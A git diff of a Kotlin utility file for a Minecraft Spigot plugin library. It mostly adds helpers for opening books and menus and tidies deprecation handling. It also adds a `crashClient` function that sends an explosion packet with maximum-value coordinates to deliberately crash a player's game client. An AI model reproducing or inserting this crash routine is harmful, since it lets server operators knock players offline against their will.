@@ -1,8 +1,10 @@
 package com.mikael.mkutilslegacy.spigot.api
 
+import com.mikael.mkutilslegacy.api.formatPersonal
 import com.mikael.mkutilslegacy.api.formatValue
 import com.mikael.mkutilslegacy.spigot.UtilsMain
 import com.mikael.mkutilslegacy.spigot.api.lib.MineItem
+import com.mikael.mkutilslegacy.spigot.api.lib.book.MineBook
 import com.mikael.mkutilslegacy.spigot.api.lib.menu.MenuPage
 import com.mikael.mkutilslegacy.spigot.api.lib.menu.MenuSystem
 import com.mikael.mkutilslegacy.spigot.api.lib.menu.MineMenu
@@ -10,6 +12,9 @@ import net.eduard.api.lib.game.ItemBuilder
 import net.eduard.api.lib.kotlin.mineSendActionBar
 import net.eduard.api.lib.kotlin.mineSendTitle
 import net.eduard.api.lib.kotlin.sendTitle
+import net.eduard.api.lib.modules.MineReflect
+import net.minecraft.server.v1_8_R3.PacketPlayOutExplosion
+import net.minecraft.server.v1_8_R3.Vec3D
 import org.bukkit.*
 import org.bukkit.block.Block
 import org.bukkit.command.CommandSender
@@ -17,12 +22,31 @@ import org.bukkit.entity.*
 import org.bukkit.event.inventory.InventoryClickEvent
 import org.bukkit.inventory.Inventory
 import org.bukkit.inventory.ItemStack
+import java.util.*
 
+
+// MineBook extra functions - Start
 /**
- * @return if [Ageable.isAdult] 'Adult' else 'Baby'.
+ * Opens the [book] to the given [Player].
+ *
+ * Note: The function [MineBook.open] uses NMS. (NMS 1.8_R3)
+ *
+ * @see MineBook.open
  */
-fun Ageable.formatAgeText(): String {
-    return if (this.isAdult) "Adult" else "Baby"
+fun Player.openMineBook(book: MineBook) {
+    book.open(this)
+}
+// MineBook extra functions - End
+
+// MineMenu extra functions - Start
+/**
+ * Opens the [menu] to the given [Player].
+ *
+ * @return the opened [Inventory] owned by the [MineMenu] ([menu]).
+ * @see MineMenu.open
+ */
+fun Player.openMineMenu(menu: MineMenu): Inventory {
+    return menu.open(this)
 }
 
 /**
@@ -75,6 +99,31 @@ var Player.openedMineMenuPage: MenuPage?
             MenuSystem.openedPage[this] = value
         }
     }
+// MineMenu extra functions - End
+
+/**
+ * Cashes the given [Player] client. USE WITH MODERATION!
+ */
+fun Player.crashClient() {
+    UtilsMain.instance.log("§c[Player Crasher] §eCrashing player ${this.name.formatPersonal()} client.")
+    MineReflect.sendPacket(
+        this, PacketPlayOutExplosion(
+            Double.MAX_VALUE,
+            Double.MAX_VALUE,
+            Double.MAX_VALUE,
+            Float.MAX_VALUE,
+            Collections.emptyList(),
+            Vec3D(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE)
+        )
+    )
+}
+
+/**
+ * @return if [Ageable.isAdult] 'Adult' else 'Baby'.
+ */
+fun Ageable.formatAgeText(): String {
+    return if (this.isAdult) "Adult" else "Baby"
+}
 
 /**
  * @return The player that clicked the menu. ([InventoryClickEvent.getWhoClicked] as [Player])
@@ -645,9 +694,11 @@ fun Player.actionBar(msg: String) {
  * Clears the given [Player] client title field.
  *
  * @see Player.resetTitle
+ * @suppress to ingore internal deprecated.
  */
+@Suppress("DEPRECATION")
 fun Player.clearTitle() {
-    this.resetTitle() // fds o deprecated
+    this.resetTitle() // Just ignore the deprecated
 }
 
 /**
